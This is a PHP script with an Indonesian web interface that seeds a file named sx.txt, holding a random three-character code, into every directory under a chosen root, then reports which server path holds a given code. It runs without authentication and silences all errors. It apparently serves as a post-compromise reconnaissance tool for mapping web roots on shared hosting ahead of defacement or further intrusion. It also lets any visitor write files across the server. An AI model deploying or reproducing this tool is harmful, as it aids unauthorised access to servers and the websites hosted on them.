<?php
# NPpGnB8mecjwOFVmW1YaRIdYGoWaQbyCZX
error_reporting(0);

function generate_random_text($length = 3) {
    return substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, $length);
}

function write_file_recursively($dir, $filename, $level = 1, $max_level = 6) {
    if ($level > $max_level || !is_dir($dir)) return;

    $filepath = rtrim($dir, '/') . '/' . $filename;
    $content = generate_random_text();
    @file_put_contents($filepath, $content);

    foreach (glob($dir . '/*', GLOB_ONLYDIR) as $subdir) {
        write_file_recursively($subdir, $filename, $level + 1, $max_level);
    }
}

function find_file_by_content($dir, $filename, $target_content, $level = 1, $max_level = 5, &$found = []) {
    if ($level > $max_level || !is_dir($dir)) return;

    $filepath = rtrim($dir, '/') . '/' . $filename;
    if (is_file($filepath)) {
        $content = trim(@file_get_contents($filepath));
        if ($content === $target_content) {
            $found[] = realpath($dir);
        }
    }

    foreach (glob($dir . '/*', GLOB_ONLYDIR) as $subdir) {
        find_file_by_content($subdir, $filename, $target_content, $level + 1, $max_level, $found);
    }
}

function show_copy_form($cwd) {
    echo '<h3>🌱 Tanam <code>sx.txt</code> (isi unik tiap folder)</h3>
    <form method="post">
        <label>Direktori root:</label>
        <input type="text" name="base" value="' . htmlspecialchars($cwd) . '" style="width:400px">
        <input type="submit" value="Tanam">
    </form>';
}

function show_search_form($cwd) {
    echo '<h3>🔍 Cari <code>sx.txt</code> berdasarkan isi</h3>
    <form method="post">
        <label>Direktori root:</label><br>
        <input type="text" name="base" value="' . htmlspecialchars($cwd) . '" style="width:400px"><br><br>
        <label>Isi sx.txt (3 karakter):</label>
        <input type="text" name="text" maxlength="3" required pattern="[a-zA-Z0-9]{3}">
        <input type="submit" value="Cari">
    </form>';
}

$cwd = getcwd();
$filename = 'sx.txt';
$command = isset($_GET['c']) ? $_GET['c'] : '';

echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>sx.txt Tool</title></head><body style="font-family:sans-serif;">';

if ($command === 'copy') {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['base'])) {
        $base = rtrim($_POST['base'], '/');
        if (is_dir($base)) {
            write_file_recursively($base, $filename);
            echo "<p style='color:green;'>✅ Berhasil tanam <b>$filename</b> (isi acak) ke semua folder dalam <b>$base</b></p>";
        } else {
            echo "<p style='color:red;'>❌ Direktori tidak valid: <b>$base</b></p>";
        }
    }
    show_copy_form($cwd);
    echo '</body></html>';
    exit;
}

if ($command === 'search') {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['base'], $_POST['text'])) {
        $base = rtrim($_POST['base'], '/');
        $target = substr(trim($_POST['text']), 0, 3);
        $found = [];

        if (!preg_match('/^[a-zA-Z0-9]{3}$/', $target)) {
            echo "<p style='color:red;'>❌ Isi harus 3 karakter alfanumerik.</p>";
        } else if (!is_dir($base)) {
            echo "<p style='color:red;'>❌ Direktori tidak valid: <b>$base</b></p>";
        } else {
            find_file_by_content($base, $filename, $target, 1, 5, $found);
            if ($found) {
                echo "<h3>✅ Ditemukan <b>$filename</b> berisi <code>$target</code> di:</h3><ul>";
                foreach ($found as $f) echo "<li>" . htmlspecialchars($f) . "</li>";
                echo "</ul>";
            } else {
                echo "<p style='color:red;'>❌ Tidak ditemukan <b>$filename</b> dengan isi <code>$target</code> dalam <b>$base</b></p>";
            }
        }
    }
    show_search_form($cwd);
    echo '</body></html>';
    exit;
}

echo "<h3>📌 Tool: sx.txt Seeder & Finder</h3>
<p>Gunakan parameter berikut di URL:</p>
<ul>
    <li><code>?c=copy</code> → Tanam <code>sx.txt</code> ke semua folder (isi random)</li>
    <li><code>?c=search</code> → Cari <code>sx.txt</code> berdasarkan isi</li>
</ul>
</body></html>";
